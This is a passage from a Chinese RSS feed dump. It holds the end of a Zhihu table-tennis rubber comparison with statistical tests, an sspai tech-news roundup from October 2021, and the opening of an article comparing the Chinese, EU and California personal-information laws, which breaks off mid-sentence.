data-private-watermark-src=\"\"></p>\n<p>用T05H发的奔球非常出色，速度快，摩擦够。尤其是上旋奔球，弧线和速度的平衡堪称完美。</p>\n<hr>\n<h2>实验结果</h2>\n<h3>排名数据表</h3>\n<p>经过上述测评项目，我们收集到了以下排名数据（1代表在四款套胶中<b>排名第一，表现最好，以此类推</b>）：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-390607aaaf046baa4935e32a443a1465_720w.jpg?rss\" data-rawwidth=\"648\" data-rawheight=\"384\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-390607aaaf046baa4935e32a443a1465\" data-watermark-src=\"v2-0e357c8f3c765ca4be59146e6e8be7b1\" data-private-watermark-src=\"v2-6c0cf8c91370076c6bc6e351664aa6da\"></p>\n<p>经过笔者对自身的盲测，可以认为该结果是相对客观的。每一款套胶的个性都很鲜明，都能在不同的技术动作中迅速判断出正在使用的套胶。我们可以看到，蓝国的排名中时常出现两极分化（同时出现1和4），这是因为我们三人中有两人是力量型打法（横板弧圈或直板爆冲），会在发力技术中更喜欢蓝国；而中等力量控制风格的球友更倾向于蝴蝶的产品，中小力量下手感清晰，整体也比较省力。在这种情况下，他最不欣赏蓝国是很好理解的。</p>\n<p>排名的过程时常伴随着痛苦。毕竟它们都已是世界上最顶级的套胶，很多时候性能表现已经可以令人满意，但仍不得不将其排在最后一位。<i>乒乓器材界看来也挺卷的（不是</i></p>\n<p>因此，在接下来对数据的分析中，笔者不会对排在末尾的套胶之性质定义为“差”——只是“相对一般，没有那么惊艳”而已。</p>\n<h3>非参数统计</h3>\n<p>每块套胶在某一个技术点上，都分别获得了三个排名（1/2/3/4）。我们不妨将1定义为“最好”，2定义为“次好”，3定义为“不错”，4定义为“一般”。分别对每块套胶得到的评价进行分类统计：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5a58e4fe7f09c3f14becde869b2e960d_720w.jpg?rss\" data-rawwidth=\"650\" data-rawheight=\"162\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5a58e4fe7f09c3f14becde869b2e960d\" data-watermark-src=\"v2-faf5e89854f39239588d8fc7caee4a37\" data-private-watermark-src=\"v2-3a61eb341c29936e9cffddbbfeaea79f\"></p>\n<p>我们可以看到，蓝国得到“最好”评价的次数是最多的，在11个测试项中获得了高达15次。紧接着是D09c的10次。虽然D09c的“最好”评价不如蓝国多，但它的“次好”评价非常多，显得比较均衡，短板更少。那么，我们是否可以认为D09c有资格成为蓝国的替代品呢？</p>\n<p>我们不妨构造一个非参数统计的假设检验，通过量化手段验证我们的猜想（流程<i>并不完全</i>是理想状态下的随机，但在适当妥协下有一定的可信度）：</p>\n<p>测试人员除笔者之外，前来参与都有一定的随机性；各人的打法风格差别很大，未出现同一种评价标准扎堆的状况；每一项技术动作都进行了独立的测试，而非一锅粥乱玩之后凭记忆去排名。</p>\n<p>在上述条件下，我们<b><i>不那么严谨</i></b>地将实验情形重构为：</p>\n<blockquote>在一个总人数为66人的池中，随机抽取33人测评A套胶，另外33人测评B套胶，并分别对其作出“最好”、“次好“、”不错“、”一般“四个档次的评价。我们需要探究的是：A套胶是否优于B套胶？</blockquote>\n<p>这里面仍有颇多值得商榷之处，例如每组随机抽取的33人，他们的评测喜好极大概率不是根据这11个技术点均匀分布。经过在严谨性上相当程度的妥协，我们选取<b>蓝国</b>的数据及<b>D09c</b>的数据，就上述引用的问题进行一个非参数统计的检验：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=H_0%3A%E8%93%9D%E5%9B%BD%E4%B8%8ED09c%E6%B2%A1%E6%9C%89%E6%98%8E%E6%98%BE%E7%AD%89%E7%BA%A7%E4%B8%8A%E7%9A%84%E5%B7%AE%E8%B7%9D%3B\" alt=\"H_0:蓝国与D09c没有明显等级上的差距;\" eeimg=\"1\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=H_%7Ba%7D%3A+%E8%93%9D%E5%9B%BD%E4%BC%98%E4%BA%8ED09c%E3%80%82\" alt=\"H_{a}: 蓝国优于D09c。\" eeimg=\"1\"></p>\n<p>进行一个Mann Whitney U Test (Wilcoxon Rank-Sum Test):</p>\n<div class=\"highlight\"><pre><code class=\"language-text\"><span></span>// 懒得算了，上计算器\n</code></pre></div>\n<p>通过计算<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"2\" data-text=\"非参数统计计算器\" data-url=\"https://www.statskingdom.com/170median_mann_whitney.html\">[2]</sup>可得： <img src=\"https://www.zhihu.com/equation?tex=p%3D0.4756%3E%3E0.05\" alt=\"p=0.4756&gt;&gt;0.05\" eeimg=\"1\"> 。</p>\n<p>因此，由这66个数据点我们得出的结论是，<b>蓝国并不优于D09c，D09c是一个值得考虑的代替选项</b>。</p>\n<h3>投票结果</h3>\n<p>事实也正是如此。经过基本完整测评的三位中，两位横板选手均更喜欢D09c，并计划在接下来一次的器材中使用它。笔者更喜欢蓝国，但也同意如果想更换蝴蝶套胶换换口味，D09c是这三块蝴蝶套胶中最好的选择。</p>\n<hr>\n<h2>总结</h2>\n<h3>上文实验结论</h3>\n<p>综上，我们可以从实验中得出结论，D09c从单纯的性能上（不谈潜在寿命以及与之相关的性价比），并不逊于蓝国，是狂飙3相当完美的替代品。</p>\n<p><b>那么另外两款剩下的套胶呢？</b></p>\n<h3><b>惊回头</b></h3>\n<p>同样地，我们对D05及T05H分别与蓝国进行非参数检验：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%28D05%E7%BB%84%29%3D0.0005253+%3C%3C+0.05\" alt=\"p(D05组)=0.0005253 &lt;&lt; 0.05\" eeimg=\"1\"> ，可以认为在该66人的实验中，有很强证据去支持“蓝国正手表现优于D05”的结论；</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%28T05H%E7%BB%84%29%3D0.04457+%3C+0.05\" alt=\"p(T05H组)=0.04457 &lt; 0.05\" eeimg=\"1\"> ，可以认为在该66人的实验中，有较强的证据去支持“蓝国正手表现优于T05H”的结论。</p>\n<p>D05似乎相比蓝国有明显的劣势。这也不能怪它，已经是很全面强大的套胶了，只是蓝国毕竟是乒乓王国的金字招牌，比不过也没什么太值得可惜。与正手评价相反，D05在反手能力强大的选手眼中，可能是最佳的反手套胶选项之一——这是后话了；</p>\n<p>T05H在实验中被判定较强证据负于蓝国，原因有很多。一来实验设计本身不够严谨，上文已经提及；二来参与核心测评的几位都是惯用狂飙者，评价难免倾向于自己的习惯（笔者虽玩过全部蝴蝶旗舰，但近一两年始终使用狂飙3）。不过，虽然测评者的习惯问题有悖于假设检验的随机性要求，但却是暗中切题的，即“T05H是否是狂飙3的惯用者良好的替代品“。</p>\n<p>笔者认为，关于“T05H是否逊于蓝国”，这个议题不忙于下明确的结论。但国产套胶使用者对它的适应程度不如D09c，几乎已是无可争议的。</p>\n<h3>简言之</h3>\n<p>D09c值得绝大多数选手尝试，无论是国产套胶转进口套胶（如本文），抑或是外国选手对粘性套胶存在需求，但又担心无法立刻适应狂飙（如奥恰洛夫<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\" data-text=\"对奥恰洛夫使用D09c的采访\" data-url=\"https://butterflyonline.com/dignics-09c-interview-with-top-player-dimitrij-ovtcharov/\">[3]</sup>）；如果你很擅长使用涩性套胶如T05，那么T05H也许是一个不逊于D09c的选项也未可知；D05作为正手表现尚可，怎奈已有两位蝴蝶老大哥在前，面对蓝国也没有获得评价上的优势。基于动作结构的不同，也许它更适合作为反手的套胶。事实上，笔者就是这么做的。</p>\n<p>感谢阅读，我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/4ddc84af53c5eefebaba37242af59e8f\" data-hash=\"4ddc84af53c5eefebaba37242af59e8f\" data-hovercard=\"p$b$4ddc84af53c5eefebaba37242af59e8f\">@叶子盛</a> ，一个想把每个爱好都做到职业水平的斜杠青年。欢迎交流。</p>\n<hr>\n<p><b>彩蛋</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8c81c3292596c8aa2936c071907e9b33_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8c81c3292596c8aa2936c071907e9b33\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>测了一下胶皮发球的指向性。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-678854e8653cba00486249242f2af862_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-678854e8653cba00486249242f2af862\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>同样地，还是蓝国最狠。</p>\n<p><b>一些测评中有意思的回合</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1dd88c91448ad086a39322718b2a7606_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1dd88c91448ad086a39322718b2a7606\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>测快带时瞎玩的拍下旋之流，背景板+1</p>\n<p><img src=\"https://pic3.zhimg.com/v2-89adc3487e5933ad35ef97d99f0a7cb1_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-89adc3487e5933ad35ef97d99f0a7cb1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>晃搓正手大角，高级技术，背景板+2</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a62f646233d948fe5bd0699c3b05b809_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a62f646233d948fe5bd0699c3b05b809\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>接发侧拧，背景板+3</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0289b0672bc1af97d01d217c7e92f794_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0289b0672bc1af97d01d217c7e92f794\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>远台兜侧下接反拉直线，终于不是我当背景板了（</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7fea7b8143f08afe18de273e4beba961_720w.gif?rss\" data-rawwidth=\"600\" data-rawheight=\"338\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7fea7b8143f08afe18de273e4beba961\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>网上似乎这个回弹过网的操作很受欢迎，但其实难度挺小的（</p>\n<p>欢迎关注，会带来更多高质量、零恰饭的作品。人生如游戏，希望我能在这里玩得开心，你们也看得开心。</p>\n<p>往期精选内容见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic2.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4_l.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p>奥运赛事简评见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic2.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9_l.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>感谢看到这里，下次再会。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475060391/answer/2028684418?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/421450032?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">大学体育选课乒乓球。求推荐一个球拍（500左右的）。还有要到什么平台上买好。?</a><br><a href=\"http://www.zhihu.com/question/475060379?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">真正懂羽毛球的人，都买了什么样的羽毛球和羽毛球拍？</a><br>\n","link":"http://www.zhihu.com/question/475060391/answer/2028684418?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：Apple Watch Series 7 即将发售、Google Pixel 6 系列手机发布会正式定档等","date":"2021-10-08 00:55:29","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Apple Watch Series 7 即将发售</h3>\n<p>10 月 4 日，Apple 更新 Newsroom 信息，正式宣布 Apple Watch Series 7 将于 10 月 8 日（周五），也就是今晚北京时间晚 8 点起接受订购，并将于 10 月 15 日（周五）起正式发售，Apple Watch Series 7 起售价为 RMB 2,999。</p>\n<p>Apple Watch Series 7 搭载迄今用在 Apple Watch 上尺寸最大、技术最先进的显示屏。新增了 QWERTY 键盘，支持两种新设计的表盘且充电速度也有 33% 的提升。Apple Watch Series 7 提供 41 毫米和 45 毫米两种尺寸选择；材质方面提供五种美观的全新铝金属表壳，包括午夜色、星光色、绿色、新款蓝色和红色，不锈钢表款的配色包括银色、石墨色和金色，Apple Watch Edition 则包括钛金属与深空黑钛金属表壳。<a href=\"https://www.apple.com.cn/newsroom/2021/10/apple-watch-series-7-orders-start-friday-october-8/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9btb34teit0pn840.png\"></figure><h3>Google Pixel 6 系列手机发布会正式定档</h3>\n<p>Google 于 10 月 5 日正式宣布，将于美东时间 10 月 19 日下午 1 点举行线上发布活动，该活动将正式发布 Pixel 6 系列手机，两款机型搭载 Google 首款自研移动芯片 Tensor，速度快、更智能、且安全，还能充分适应你的节奏，此外更强大的相机也是一大亮点。<a href=\"https://www.ithome.com/0/579/141.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9c5b34teh5fkvqr0.png\"></figure><h3>三星电子宣布 3 纳米芯片技术推迟至明年上市</h3>\n<p>10 月 7 日，三星电子正式宣布 3nm 芯片技术因为技术难度原因，推迟至 2022 年上半年正式上市。其次，也透露有关 2nm 制成技术的相关信息，该技术将于 2025 年面市。<a href=\"https://www.gizmochina.com/2021/10/07/samsung-3nm-chip-production-delay/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9cdb34teh5fkvqrg.png\"></figure><h3>Twitch 遭黑客泄漏代码以及财务记录</h3>\n<p>10 月 6 日，Amazon Twitch 直播平台遭到黑客攻击，有相关黑客匿名在网络论坛中公布了 Twitch 源代码、评论相关的历史数据、财务状况以及 Vapor 的相关信息。<a href=\"https://www.wired.com/story/devastating-twitch-hack-sends-streamers-reeling/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9clb34teh3cl9390.jpeg\"></figure><h3>Apple 为 AirPods 2/Pro/Max 推送新版固件</h3>\n<p>Apple 于 10 月 5 日向 AirPods 2、AirPods Pro、AirPods Max 三款无线耳机推送了 4A400 固件更新，本次更新将使得以上三款耳机支持最新的 Find My 查找功能，该功能将帮助用户通过 Find My 网络查找用户的耳机设备，并给出相应的位置，另外 AirPods Pro 还在本次更新中获得 Conversation Boost 功能，可以在嘈杂的环境中更容易听清别人跟你进行对话。<a href=\"https://arstechnica.com/gadgets/2021/10/airpods-pro-firmware-update-makes-finding-lost-earbuds-easier/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9clb34teh0gc1r5g.png\"></figure><h3>Pixel 闻声识曲功能在 Android 12 上将支持云端搜索</h3>\n<p>10 月 6 日，据 9to5google 发现 Google 已向部分 Android 12 测试版用户推送了闻声识曲功能的改进更新。通常闻声识曲功能仅基于本地工作，且在没有用户同意的前提下也不会将录音发送给 Google，但受到数据库大小的限制闻声识曲功能并不能识别用户在听的所有歌。而在打开闻声识曲功能的云端搜索开关以后，对本地搜索不能识别的歌曲它将在锁屏上显示一个音乐搜索图标，只有点击这个图标才会将对应的音频数据发送给 Google 以便进一步识别。<a href=\"https://9to5google.com/2021/10/06/now-playing-on-pixel-rolling-out-cloud-search-for-android-12/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5fp9ctb34teh3cl939g.png\"></figure><h3>AMD 确认其部分处理器在 Windows 11 下存在性能问题</h3>\n<p>AMD 于 10 月 6 日正式确认，目前部分 Ryzen 处理器在 Windows 11 下存在性能问题，相比 Windows 10 其运行速度最高可能慢 10% -15%。主要体现在两个方面：L3 缓存延迟增加以及 AMD 首选核心技术可能无法在最快的核心上正确安排线程，目前 AMD 正在开发软件更新来解决问题，预计将会在 10 月底完成。<a href=\"https://mspoweruser.com/amd-confirms-windows-11-performance-issues-with-some-chipsets/\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>Clien 论坛有人爆料称，AMD 正在和微软合作，为 Surface 笔记本产品定制一款基于 ARM 架构的处理器，该处理器 CPU 将基于 Cortex X1 内核，而 GPU 则为 RDNA 2，8CU 设计或 4 WGP，目标性能可能不如 GeForce GTX 1050 但比现阶段的高通处理器要强。<a href=\"https://www.ithome.com/0/578/894.htm\" target=\"_blank\">来源</a>\n</li>\n<li>外媒 wccftech 于 10 月 6 日曝光了华硕多款 Z690 系列主板产品，主要分为 DDR5 内存和 DDR4 内存版本，其中旗舰型号为 ROG Maximus Z690 HERO，预计采用 20+1 相供电，支持 90A 电流，售价 788.99 加拿大元，约合 4035 元人民币。<a href=\"https://www.ithome.com/0/579/197.htm\" target=\"_blank\">来源</a>\n</li>\n<li>外媒 sonyalpharumors 于 10 月 6 日爆料，索尼 A7M4 微单相机将于 10 月 21 日正式发布。<a href=\"https://sparrowsnews.com/2021/10/06/sony-a7m4-specifications-and-release/amp/\" target=\"_blank\">来源</a>\n</li>\n<li>据 YouTuber Nintendo Prime 爆料，即将发售的 Switch OLED 配备的底座支持输出 4K 60fps 画面。<a href=\"https://m.youtube.com/watch?v=KGFAN0yhnM4\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>🚗 国庆不想出远门？一起在 <a href=\"https://sspai.com/bullet/1632815670\" target=\"_blank\">一派</a> 聊聊你所在的城市附近都有哪些值得一去的地方吧！</li>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=655886576972\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/69001\" target=\"_blank\">🕹️ 玩游戏能救任天堂？|「世界主宰」的掌机之路 · 零</a></li>\n<li><a href=\"https://sspai.com/post/68989\" target=\"_blank\">🌲 想在电脑和 Android 端同步 Obsidian 笔记？让 Git 帮你牵线搭桥</a></li>\n<li><a href=\"https://sspai.com/post/69007\" target=\"_blank\"> 萤幕、影像、性能处处 Pro，一台没有「短板」的好手机：iPhone 13 Pro 体验</a></li>\n<li><a href=\"https://sspai.com/post/69069\" target=\"_blank\">🌟 新玩意 079｜少数派的编辑们最近买了啥？</a></li>\n<li><a href=\"https://sspai.com/prime/story/mkdocs-primer\" target=\"_blank\">📓 笔记文档一把梭——MkDocs 快速上手指南</a></li>\n<li><a href=\"https://sspai.com/post/69083\" target=\"_blank\">🎬 本周看什么丨最近值得一看的 7 部作品</a></li>\n<li><a href=\"https://sspai.com/post/68830\" target=\"_blank\">😲 一日一技 | 解决 Minecraft 在 M1 Mac 上的 Error 255 报错</a></li>\n<li><a href=\"https://sspai.com/post/69082\" target=\"_blank\">🔖 不读可以先收藏 03 | 这些好文让你的假期更充实</a></li>\n<li><a href=\"https://sspai.com/post/69093\" target=\"_blank\">📽️ 看什么 · 特别篇丨秋天到了，我最想生活在这 10 部电影里</a></li>\n<li><a href=\"https://sspai.com/post/69091\" target=\"_blank\">📝 与保险「共舞」多年悟出的 5 条心得，或许能让你少走弯路</a></li>\n<li><a href=\"https://sspai.com/post/69097\" target=\"_blank\">📱 平衡与极致：iPhone 13 &amp; iPhone 13 Pro Max 体验</a></li>\n<li><a href=\"https://sspai.com/post/69105\" target=\"_blank\">🎉 派评 | 近期值得关注的 App</a></li>\n<li><a href=\"https://sspai.com/post/68195\" target=\"_blank\">📁 城市收藏夹 · 香港：两年不见，甚是想念</a></li>\n<li><a href=\"https://sspai.com/post/69072\" target=\"_blank\">👀 Windows 11 正式版发布，升级后一定不要错过这些新特性</a></li>\n<li><a href=\"https://sspai.com/post/69064\" target=\"_blank\">🖱️ 它或许能拯救你酸痛的手臂：浅谈人体工学鼠标</a></li>\n<li><a href=\"https://sspai.com/post/69117\" target=\"_blank\">🤟 Android 平台的颜值标杆：Material You 应用大赏</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol09-how-to-drink-coffee-anywhere\" target=\"_blank\">☕ 尝试了几十种速溶咖啡后，想和你聊聊移动咖啡馆</a></li>\n<li><a href=\"https://sspai.com/post/69116\" target=\"_blank\">⚖️ 观千剑而后识器——中美欧个人信息保护法规比较</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69176"},{"title":"观千剑而后识器——中美欧个人信息保护法规比较","date":"2021-10-07 06:17:13","description":"\n<p><strong>编注：</strong>本文原文由北京市中伦律师事务所李瑞律师、贾申律师、钟俊鹏律师、李梦涵律师撰写，团队执业领域包括反垄断与竞争法、数据合规与网络安全、跨境投资并购等。少数派经授权在原文基础上修订并转载。</p>\n<hr>\n<h2>引言</h2>\n<p>在此前发布的<a href=\"https://sspai.com/post/68832\" target=\"_blank\">《吹尽狂沙始到金——〈个人信息保护法〉有哪些亮点值得关注？》</a>一文中，我们已经对这一国内首部专门规范个人信息保护的法律做了详细解读。</p>\n<p>不过，在信息高速全球互通、网络服务跨越国界的当今，一国用户几乎不可能只跟该国国内的互联网公司打交道；相应地，其个人信息也会被全球各地的公司所收集和处理。在这样的背景下，不仅仅在中国，世界各地的立法和监管部门，都将个人信息相关立法作为高优先级议程。</p>\n<p>如果你有浏览国外网站、使用国外应用的经验，一定对如今满天飞的各种「弹窗」「横幅」不陌生。这些元素设计各异，但内容和功能都是告知用户将会收集、处理的个人信息类型，使用 Cookies 的情况，并要求用户同意。不用说，这显然是运营公司适用的当地个人信息法规在发挥威力。</p>\n<p>那么，除了中国，世界上目前还有哪些主要的个人信息保护法规，它们与《个人信息保护法》又有哪些异同呢？</p>\n<p>首先，在世界范围内谈到个人信息保护，欧盟的<strong>《通用数据保护条例》</strong>（General Data Protection Regulation, GDPR）一定是无法回避的话题。这部由欧盟制定的 GDPR 已于2018年5月生效，常常被视为世界范围内在隐私保护领域最为权威和细致的立法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/f637c1b6826d4cde4c04410f6051cfb9\"></figure><p>再把目光放到美国。作为一个联邦制国家，美国在联邦层面的个人信息立法相对分散，相关权利义务散见于医疗、金融、儿童保护等方面的专门法规。因此，很多州选择自行制定个人信息保护的专门法规。</p>\n<p>其中，推进较快、影响力相对最大的，要数加州于 2018 年颁布的<strong>《加州消费者隐私法案》</strong>（California Consumer Privacy Act of 2018, CCPA）及其 2020 年的修正案<strong>《加州隐私权法案》</strong>（California Privacy Rights Act of 2020, CPRA）。尽管看起来管辖范围只有一州，但鉴于加州科技公司扎堆的显赫区位，CPRA 也已成为一部备受关注的重量级法案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/fd664d20ae4e699743a544f1e8a90717\"></figure><p>下面，本文就以这三部法律为作为当今世界个人信息保护法规的代表，对比中、美、欧三地个人信息保护制度的联系与区别。</p>\n<h2>「个人信息」与「个人信息处理活动」：界定方式不谋而合，行为列举异中有同</h2>\n<p>要谈「个人信息保护」，首先要回答两个门槛性质的问题：一是「什么数据才算个人信息」，二是「什么活动才算处理个人信息。毕竟，只有在判断「个人信息」、界定「个人信息处理活动」的基础上，才有相应的权利义务可言，才能制定具体的行为准则。</p>\n<p>先看个人信息的定义。从下图可见，就一般个人信息的定义而言，三部法律不谋而合，都强调个人信息的<strong>「可识别性」</strong>特征，即能识别特定个人的信息才算个人信息。其中，CPRA 定义的外延略微偏小，进一步通过数据与个人「合理」的「关联性」对其定义进行限缩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/4d7754bb1820e643702bab47b604fa36\"></figure><p>在定义方式上，个保法采取归纳式概括法， GDPR 和CPRA 除概念外还列举了多种满足条件的信息类型。</p>\n<p>此外，三部法律都<strong>区分了一般类型的个人信息和敏感个人信息</strong>（在 GDPR 中被称作「特殊类型个人数据」）。如下图所示，三部法律都对敏感个人信息具体包含的数据类型进行了列举，但其具体涵盖类型存在差异，可谓是既有区别又有联系。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/010d98e0c87e802626e6208f9bff1154\"></figure><p>至于针对敏感个人信息的特殊保护方式，个保法和 GDPR 都设置了更高要求的处理条件，如必须用于特定目的、收集处理行为必须是充分必要、必须由信息主体明示或单独同意，以及采取更严格的保护措施等；而 CPRA 则没有做出此类特别规定。</p>\n<p>再看个人信息处理的界定。三部法律都选择了列举方式定义，而列举的内容则存在差异且各有特色：</p>\n<blockquote><p><strong>个保法：</strong>收集、存储、使用、加工、传输、提供、公开、删除</p></blockquote>\n<blockquote><p><strong>GDPR：</strong>收集，记录，组织，建构，存储，改编或修改，恢复，查询，使用，通过传输、分发方式进行披露或者其他使个人数据可被他人获得、排列或组合、限制、删除或销毁</p></blockquote>\n<blockquote><p><strong>CPRA ：</strong>收集、使用、存储、披露、出售、共享</p></blockquote>\n<p>可见，GDPR 所列举的处理方式最多，个保法列举的处理方式次之，但是二者都没有对具体的处理活动进行细致的描述。CPRA 则最为精简，没有详细列举处理活动的类型，仅提及 6 种行为。结合该法上下文，可知加州立法者希望重点规范的是数据的收集、出售和共享行为。</p>\n<p>但这并不意味着加州约束的个人信息处理范围就更窄。特别值得关注的是 CPRA 中的「共享」行为——个保法和 GDPR 都没有对此进行规定。根据 CPRA，「共享」应当采取广义上的理解，可指向<strong>企业通过任何方式向第三方披露个人信息</strong>，并且特别点名包括了所谓<strong>「跨场景行为广告」</strong>（Cross-context behavioral advertising）。这指的是根据从消费者的跨越场景的行为（例如不同企业、品牌的网站、应用、服务等）中获取的个人信息向消费者投放广告，且不论消费者是否是与之<strong>有意</strong>互动的。如果你曾经见识过「搜了尿布，全世界都来推销奶粉」的威力，应该能理解这条规定对广告行业的潜在影响。</p>\n<h2>管辖范围：望洋未必兴叹，鞭长四海可及</h2>\n<p>本文开头就提到，信息全球流通、服务覆盖各地，是当今互联网的常态。如果你是立法者，肯定不会仅仅因为一家公司注册在境外、或者机房设在境外，就对它收集境内用户数据的行为视而不见。问题是，如何从法律角度涵盖这样的行为呢？</p>\n<p>这就要先了解一下「管辖」这个法律概念。你或许听说过某某法院「管辖」某某案件的说法——这就是狭义的管辖，指法院受理案件的权限和分工，换句话说也就是什么样的案子交由哪个法院负责。</p>\n<p>不过，在广义上，「管辖」也可以指某部法律的覆盖范围、某个执法机构的权限与范围，换句话说，哪些主体的哪些行为将受到约束。</p>\n<p>回到本文涉及的三部法律，它们的管辖范围如下图所总结：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/7ac39b6ba12f1897bc210eaebf9e55ad\"></figure><p>可以看出，三部法律都管辖境外实体在境内的个人信息处理行为，但在具体范围上存在着比较大的差异。</p>\n<p>其中，GDPR 